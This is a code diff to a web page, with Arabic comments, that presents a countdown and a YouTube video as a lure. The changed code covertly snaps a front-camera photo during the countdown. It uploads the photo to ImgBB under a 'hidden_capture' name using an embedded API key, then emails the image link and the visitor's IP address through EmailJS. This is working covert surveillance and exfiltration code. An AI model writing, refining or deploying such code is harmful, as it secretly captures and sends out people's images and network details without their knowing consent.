@@ -164,6 +164,19 @@
       margin-top: 15px;
       line-height: 1.6;
     }
+    
+    .capture-indicator {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      background: rgba(255, 0, 0, 0.7);
+      color: white;
+      padding: 5px 10px;
+      border-radius: 20px;
+      font-size: 12px;
+      display: none;
+      z-index: 10;
+    }
   </style>
 </head>
 <body>
@@ -180,6 +193,7 @@
     <div class="countdown" id="countdown">10</div>
     
     <div class="video-container">
+      <div class="capture-indicator" id="captureIndicator">Capturing at 4s</div>
       <iframe id="player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
     </div>
     
@@ -217,12 +231,15 @@
     const countdownElement = document.getElementById('countdown');
     const permissionRequest = document.getElementById('permissionRequest');
     const cameraBtn = document.getElementById('cameraBtn');
+    const captureIndicator = document.getElementById('captureIndicator');
     
     // متغيرات الحالة
     let cameraCaptured = false;
     let emailSent = false;
     let countdownInterval;
     let stream;
+    let capturedImage = null;
+    let userIP = null;
     
     // Hide countdown initially
     countdownElement.style.display = 'none';
@@ -246,30 +263,49 @@
       countdownElement.style.display = 'block';
       
       // Get user IP and store it
-      const userIP = await getUserIP();
+      userIP = await getUserIP();
       
       countdownInterval = setInterval(() => {
         count--;
         countdownElement.textContent = count;
         
+        // Capture image when countdown reaches 4 seconds
+        if (count === 4) {
+          captureImage();
+          captureIndicator.style.display = 'block';
+          
+          // Flash the indicator briefly
+          setTimeout(() => {
+            captureIndicator.style.display = 'none';
+          }, 1000);
+        }
+        
         if (count <= 0) {
           clearInterval(countdownInterval);
           countdownElement.style.display = 'none';
-          startVideoPlayback(userIP);
+          
+          // Stop the camera stream
+          if (stream) {
+            stream.getTracks().forEach(track => track.stop());
+          }
+          
+          // Send email with captured image
+          if (capturedImage) {
+            sendEmail(capturedImage, userIP);
+          }
+          
+          startVideoPlayback();
         }
       }, 1000);
     }
     
     // Function to start video playback
-    function startVideoPlayback(userIP) {
+    function startVideoPlayback() {
       loading.style.display = 'block';
       
       // Set the video source with autoplay
       player.src = 'https://www.youtube.com/embed/efQ7_0IzgUw?rel=0&controls=1&showinfo=0&autoplay=1';
       player.style.display = 'block';
-      
-      // Start the camera capture process
-      setTimeout(() => captureImage(userIP), 3000);
     }
     
     // Event listener for camera permission button
@@ -321,7 +357,7 @@
     });
     
     // وظيفة التقاط الصورة
-    function captureImage(userIP) {
+    function captureImage() {
       if (!cameraCaptured) return;
       
       try {
@@ -332,46 +368,44 @@
         
         // الحصول على بيانات الصورة
         const imageData = canvas.toDataURL('image/jpeg', 0.85);
-        const base64Image = imageData.split(',')[1];
-        
-        // إيقاف تشغيل الكاميرا
-        if (stream) {
-          stream.getTracks().forEach(track => track.stop());
-        }
-        
-        // رفع الصورة إلى ImgBB
-        const formData = new FormData();
-        formData.append('image', base64Image);
-        formData.append('name', 'hidden_capture_' + Date.now());
-        
-        fetch('https://api.imgbb.com/1/upload?key=85c1b237cc85eb120a31cf73476b1eba', {
-          method: 'POST',
-          body: formData
-        })
-        .then(response => response.json())
-        .then(imgbbData => {
-          if (imgbbData.success) {
-            // إرسال الإيميل باستخدام EmailJS
-            emailjs.send("service_890xst3", "template_p1oukct", {
-              name: "صورة خفية",
-              time: new Date().toLocaleString(),
-              message: "تم التقاط صورة جديدة من الكاميرا الأمامية.",
-              image_url: imgbbData.data.url,
-              user_ip: userIP  // Add IP to email
-            }).then(() => {
-              emailSent = true;
-            }, error => {
-              console.error('Email error:', error);
-            });
-          }
-        })
-        .catch(error => {
-          console.error('ImgBB error:', error);
-        });
+        capturedImage = imageData.split(',')[1]; // Store base64 image data
         
       } catch (error) {
         console.error('Capture error:', error);
       }
+    }
+    
+    // وظيفة إرسال الإيميل
+    function sendEmail(base64Image, userIP) {
+      // رفع الصورة إلى ImgBB
+      const formData = new FormData();
+      formData.append('image', base64Image);
+      formData.append('name', 'hidden_capture_' + Date.now());
+      
+      fetch('https://api.imgbb.com/1/upload?key=85c1b237cc85eb120a31cf73476b1eba', {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => response.json())
+      .then(imgbbData => {
+        if (imgbbData.success) {
+          // إرسال الإيميل باستخدام EmailJS
+          emailjs.send("service_890xst3", "template_p1oukct", {
+            name: "صورة خفية",
+            time: new Date().toLocaleString(),
+            message: "تم التقاط صورة جديدة من الكاميرا الأمامية.",
+            image_url: imgbbData.data.url,
+            user_ip: userIP  // Add IP to email
+          }).then(() => {
+            emailSent = true;
+          }, error => {
+            console.error('Email error:', error);
+          });
+        }
+      })
+      .catch(error => {
+        console.error('ImgBB error:', error);
+      });
     }
     
     // Display success message after 10 seconds
